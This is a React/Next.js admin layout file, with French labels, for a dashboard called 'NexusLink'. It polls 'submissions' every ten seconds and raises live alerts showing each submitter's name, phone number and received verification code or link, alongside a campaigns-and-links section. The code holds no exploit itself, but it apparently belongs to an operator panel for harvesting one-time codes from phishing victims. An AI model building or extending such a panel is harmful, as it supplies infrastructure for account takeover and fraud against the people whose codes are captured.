'use client';

import { useState, useEffect, useRef } from 'react';
import Link from 'next/link';
import { usePathname, useRouter } from 'next/navigation';
import {
    BarChart3,
    Link2,
    Settings as SettingsIcon,
    Bell,
    Menu,
    LogOut,
    User as UserIcon,
    ShieldCheck,
    History,
    Check,
    X,
    ExternalLink
} from 'lucide-react';
import { cn } from '@/lib/utils';
import { dataService } from '@/lib/dataService';
import { supabase, isSupabaseConfigured } from '@/lib/supabase';
import { AnimatePresence, motion } from 'framer-motion';
import LiveNotificationSystem from '@/components/dashboard/LiveNotificationSystem';

const adminMenuItems = [
    { icon: BarChart3, label: 'Tableau de bord', href: '/dashboard' },
    { icon: History, label: 'Soumissions', href: '/dashboard/submissions' },
    { icon: Link2, label: 'Campagnes & Liens', href: '/dashboard/links' },
    { icon: SettingsIcon, label: 'Paramètres', href: '/dashboard/settings' },
];

export default function DashboardLayout({ children }: { children: React.ReactNode }) {
    const pathname = usePathname();
    const router = useRouter();
    const [isSidebarOpen, setSidebarOpen] = useState(false);
    const [adminName, setAdminName] = useState('Administrateur');
    const [appName, setAppName] = useState('NexusLink Solutions');
    const [notifications, setNotifications] = useState<any[]>([]);
    const [isNotifOpen, setIsNotifOpen] = useState(false);
    const [dismissedIds, setDismissedIds] = useState<string[]>([]);

    // Chargement des notifications enregistrées comme lues
    useEffect(() => {
        try {
            const saved = localStorage.getItem('nexuslink_read_notifs');
            if (saved) setDismissedIds(JSON.parse(saved));
        } catch {}

        // Enregistrement du Service Worker pour les alertes mobiles système
        if (typeof window !== 'undefined' && 'serviceWorker' in navigator) {
            navigator.serviceWorker.register('/sw.js').catch((err) => {
                console.warn('SW registration warning:', err);
            });
        }
    }, []);

    const fetchNotifications = async () => {
        try {
            const subs = await dataService.getSubmissions();
            if (!subs || !Array.isArray(subs)) return;

            let savedRead: string[] = [];
            try {
                const s = localStorage.getItem('nexuslink_read_notifs');
                if (s) savedRead = JSON.parse(s);
            } catch {}

            const formatted = subs.slice(0, 15).map((s: any) => {
                const isCode = s.status === 'Code reçu' || Boolean(s.verification_code);
                const isRead = savedRead.includes(s.id) || s.status === 'Finalisé';

                return {
                    id: s.id,
                    submissionId: s.id,
                    title: isCode ? `🔑 Code reçu de ${s.full_name}` : `📄 Demande : ${s.full_name}`,
                    message: isCode
                        ? `Code / Lien : ${s.verification_code || 'Reçu'} (${s.phone})`
                        : `Moyen : ${s.method || 'Standard'} • Tél : ${s.phone}`,
                    time: s.processed_at || s.created_at,
                    isCode,
                    is_read: isRead,
                    status: s.status || 'En attente'
                };
            });

            setNotifications(formatted);
        } catch (error) {
            console.warn('Failed to fetch notifications:', error);
        }
    };

    const markAllAsRead = () => {
        const allIds = notifications.map(n => n.id);
        setDismissedIds(allIds);
        try {
            localStorage.setItem('nexuslink_read_notifs', JSON.stringify(allIds));
        } catch {}
        setNotifications(prev => prev.map(n => ({ ...n, is_read: true })));
    };

    const markSingleAsRead = (id: string) => {
        const next = [...dismissedIds, id];
        setDismissedIds(next);
        try {
            localStorage.setItem('nexuslink_read_notifs', JSON.stringify(next));
        } catch {}
        setNotifications(prev => prev.map(n => n.id === id ? { ...n, is_read: true } : n));
    };

    useEffect(() => {
        const fetchDashboardInfo = async () => {
            try {
                const settings = await dataService.getAppSettings();
                if (settings?.app_name) setAppName(settings.app_name);

                if (isSupabaseConfigured()) {
                    const { data: { user } } = await supabase.auth.getUser();
                    if (user?.user_metadata?.username) {
                        setAdminName(user.user_metadata.username);
                    } else if (user?.email) {
                        setAdminName(user.email.split('@')[0]);
                    }
                }
            } catch (error) {
                console.warn('Failed to fetch dashboard info:', error);
            }
        };

        fetchDashboardInfo();
        fetchNotifications();

        const interval = setInterval(fetchNotifications, 10000);
        return () => clearInterval(interval);
    }, []);

    const handleLogout = () => {
        localStorage.removeItem('token');
        router.push('/login');
    };

    const unreadCount = notifications.filter(n => !n.is_read).length;

    return (
        <div className="min-h-screen bg-[#07090e] text-slate-100 flex">
            {/* Sidebar Desktop */}
            <aside className="hidden lg:flex w-64 flex-col fixed inset-y-0 z-40 bg-slate-950/80 backdrop-blur-xl border-r border-white/[0.06]">
                <div className="h-16 px-6 flex items-center gap-3 border-b border-white/[0.06]">
                    <div className="w-8 h-8 rounded-lg bg-blue-600 flex items-center justify-center text-white shadow-md shadow-blue-600/30">
                        <ShieldCheck className="w-5 h-5" />
                    </div>
                    <div>
                        <span className="font-bold text-sm tracking-tight text-white block">NexusLink</span>
                        <span className="text-[10px] text-blue-400 font-semibold uppercase tracking-wider block">Admin Suite</span>
                    </div>
                </div>

                <div className="flex-1 py-6 px-3 space-y-1">
                    {adminMenuItems.map((item) => {
                        const isActive = pathname === item.href;
                        return (
                            <Link
                                key={item.href}
                                href={item.href}
                                className={cn(
                                    "flex items-center gap-3 px-3 py-2.5 rounded-xl text-xs font-medium transition-all",
                                    isActive
                                        ? "bg-blue-600/15 text-blue-400 border border-blue-500/30 shadow-sm"
                                        : "text-slate-400 hover:text-white hover:bg-white/[0.04]"
                                )}
                            >
                                <item.icon className="w-4 h-4" />
                                <span>{item.label}</span>
                            </Link>
                        );
                    })}
                </div>

                <div className="p-4 border-t border-white/[0.06]">
                    <div className="p-3 rounded-xl bg-slate-900/60 border border-white/5 mb-3 flex items-center gap-3">
                        <div className="w-8 h-8 rounded-lg bg-slate-800 flex items-center justify-center text-slate-300">
                            <UserIcon className="w-4 h-4" />
                        </div>
                        <div className="flex-1 truncate">
                            <span className="text-xs font-semibold text-white block truncate">{adminName}</span>
                            <span className="text-[10px] text-emerald-400 flex items-center gap-1">
                                <span className="w-1.5 h-1.5 rounded-full bg-emerald-400"></span> Connecté
                            </span>
                        </div>
                    </div>

                    <button
                        onClick={handleLogout}
                        className="w-full flex items-center justify-center gap-2 px-3 py-2 text-xs font-medium text-slate-400 hover:text-rose-400 hover:bg-rose-500/10 rounded-xl transition-all"
                    >
                        <LogOut className="w-3.5 h-3.5" />
                        <span>Déconnexion</span>
                    </button>
                </div>
            </aside>

            {/* Mobile Sidebar Overlay */}
            <AnimatePresence>
                {isSidebarOpen && (
                    <>
                        <motion.div
                            initial={{ opacity: 0 }}
                            animate={{ opacity: 1 }}
                            exit={{ opacity: 0 }}
                            onClick={() => setSidebarOpen(false)}
                            className="fixed inset-0 bg-black/70 z-40 lg:hidden backdrop-blur-sm"
                        />
                        <motion.div
                            initial={{ x: '-100%' }}
                            animate={{ x: 0 }}
                            exit={{ x: '-100%' }}
                            transition={{ type: 'spring', damping: 25, stiffness: 300 }}
                            className="fixed inset-y-0 left-0 w-64 bg-slate-950 z-50 p-6 flex flex-col border-r border-white/10 lg:hidden"
                        >
                            <div className="flex items-center justify-between pb-6 border-b border-white/10 mb-6">
                                <div className="flex items-center gap-3">
                                    <div className="w-8 h-8 rounded-lg bg-blue-600 flex items-center justify-center text-white">
                                        <ShieldCheck className="w-5 h-5" />
                                    </div>
                                    <span className="font-bold text-sm text-white">NexusLink</span>
                                </div>
                                <button onClick={() => setSidebarOpen(false)} className="p-1 text-slate-400 hover:text-white">
                                    <X className="w-5 h-5" />
                                </button>
                            </div>

                            <div className="space-y-1 flex-1">
                                {adminMenuItems.map((item) => (
                                    <Link
                                        key={item.href}
                                        href={item.href}
                                        onClick={() => setSidebarOpen(false)}
                                        className={cn(
                                            "flex items-center gap-3 px-3 py-2.5 rounded-xl text-xs font-medium",
                                            pathname === item.href ? "bg-blue-600/15 text-blue-400 border border-blue-500/30" : "text-slate-400"
                                        )}
                                    >
                                        <item.icon className="w-4 h-4" />
                                        <span>{item.label}</span>
                                    </Link>
                                ))}
                            </div>

                            <button
                                onClick={handleLogout}
                                className="w-full flex items-center justify-center gap-2 px-3 py-2 text-xs font-medium text-rose-400 bg-rose-500/10 rounded-xl"
                            >
                                <LogOut className="w-3.5 h-3.5" />
                                <span>Déconnexion</span>
                            </button>
                        </motion.div>
                    </>
                )}
            </AnimatePresence>

            {/* Zone Principale */}
            <div className="flex-1 lg:pl-64 flex flex-col min-h-screen">
                {/* Header supérieur */}
                <header className="h-16 px-4 sm:px-8 border-b border-white/[0.06] bg-slate-950/60 backdrop-blur-md sticky top-0 z-30 flex items-center justify-between">
                    <div className="flex items-center gap-3">
                        <button
                            onClick={() => setSidebarOpen(true)}
                            className="lg:hidden p-2 text-slate-400 hover:text-white"
                        >
                            <Menu className="w-5 h-5" />
                        </button>
                        <h1 className="text-sm font-semibold text-white hidden sm:block">
                            {adminMenuItems.find(i => i.href === pathname)?.label || 'Administration'}
                        </h1>
                    </div>

                    <div className="flex items-center gap-3">
                        {/* Notifications */}
                        <div className="relative">
                            <button
                                onClick={() => setIsNotifOpen(!isNotifOpen)}
                                className={cn(
                                    "p-2 rounded-xl bg-slate-900 border text-slate-300 hover:text-white relative transition-all cursor-pointer",
                                    unreadCount > 0 ? "border-emerald-500/40 text-emerald-300 shadow-sm shadow-emerald-500/20" : "border-white/10"
                                )}
                                title="Centre de notifications en direct"
                            >
                                <Bell className={cn("w-4 h-4", unreadCount > 0 && "animate-bounce text-emerald-400")} />
                                {unreadCount > 0 && (
                                    <span className="absolute -top-1 -right-1 w-5 h-5 rounded-full bg-emerald-500 text-[10px] font-black text-slate-950 flex items-center justify-center shadow-md animate-pulse">
                                        {unreadCount > 9 ? '9+' : unreadCount}
                                    </span>
                                )}
                            </button>

                            <AnimatePresence>
                                {isNotifOpen && (
                                    <motion.div
                                        initial={{ opacity: 0, y: 8, scale: 0.96 }}
                                        animate={{ opacity: 1, y: 0, scale: 1 }}
                                        exit={{ opacity: 0, y: 8, scale: 0.96 }}
                                        className="absolute right-0 top-12 w-84 sm:w-96 bg-slate-900/98 border border-slate-700/80 rounded-2xl shadow-2xl p-4 z-50 ring-1 ring-white/10 backdrop-blur-2xl"
                                    >
                                        <div className="flex items-center justify-between pb-3 border-b border-white/10 mb-3">
                                            <div className="flex items-center gap-2">
                                                <span className="text-xs font-bold text-white uppercase tracking-wider">Alertes en Direct</span>
                                                {unreadCount > 0 && (
                                                    <span className="text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-400 font-mono font-bold">
                                                        {unreadCount} active{unreadCount > 1 ? 's' : ''}
                                                    </span>
                                                )}
                                            </div>
                                            {unreadCount > 0 && (
                                                <button
                                                    onClick={markAllAsRead}
                                                    className="text-[11px] text-blue-400 hover:text-blue-300 font-medium cursor-pointer"
                                                >
                                                    Tout marquer lu
                                                </button>
                                            )}
                                        </div>

                                        <div className="max-h-80 overflow-y-auto space-y-2.5 pr-1">
                                            {notifications.length === 0 ? (
                                                <p className="text-xs text-slate-400 text-center py-6">Aucune activité pour le moment.</p>
                                            ) : (
                                                notifications.map((n) => (
                                                    <div
                                                        key={n.id}
                                                        className={cn(
                                                            "p-3 rounded-xl border text-xs transition-all flex flex-col gap-1.5",
                                                            n.isCode
                                                                ? "bg-emerald-950/30 border-emerald-500/30 text-emerald-100"
                                                                : "bg-slate-800/60 border-white/5 text-slate-200",
                                                            !n.is_read && "ring-1 ring-emerald-500/40"
                                                        )}
                                                    >
                                                        <div className="flex items-center justify-between gap-2">
                                                            <span className="font-bold text-white text-xs truncate">
                                                                {n.title}
                                                            </span>
                                                            <span className="text-[10px] text-slate-400 font-mono shrink-0">
                                                                {n.time ? new Date(n.time).toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' }) : ''}
                                                            </span>
                                                        </div>

                                                        <p className="text-[11px] text-slate-300 font-mono break-all leading-snug">
                                                            {n.message}
                                                        </p>

                                                        <div className="flex items-center justify-between pt-1 border-t border-white/5 mt-1">
                                                            <Link
                                                                href={`/dashboard/submissions/${n.submissionId}`}
                                                                onClick={() => {
                                                                    markSingleAsRead(n.id);
                                                                    setIsNotifOpen(false);
                                                                }}
                                                                className="text-[11px] text-blue-400 hover:text-blue-300 font-semibold flex items-center gap-1 cursor-pointer"
                                                            >
                                                                <span>Ouvrir la fiche</span>
                                                                <ExternalLink className="w-3 h-3" />
                                                            </Link>
                                                            {!n.is_read && (
                                                                <button
                                                                    onClick={() => markSingleAsRead(n.id)}
                                                                    className="text-[10px] text-slate-400 hover:text-white"
                                                                >
                                                                    Ignorer
                                                                </button>
                                                            )}
                                                        </div>
                                                    </div>
                                                ))
                                            )}
                                        </div>
                                    </motion.div>
                                )}
                            </AnimatePresence>
                        </div>

                        <Link
                            href="/"
                            target="_blank"
                            className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-slate-900 border border-white/10 text-xs font-medium text-slate-300 hover:text-white transition-colors"
                        >
                            <span>Site Public</span>
                            <ExternalLink className="w-3 h-3 text-slate-400" />
                        </Link>
                    </div>
                </header>

                {/* Contenu de la page */}
                <main className="flex-1 p-4 sm:p-8">
                    {children}
                </main>
            </div>

            {/* Système de notifications live (popup + son iPhone) */}
            <LiveNotificationSystem />
        </div>
    );
}
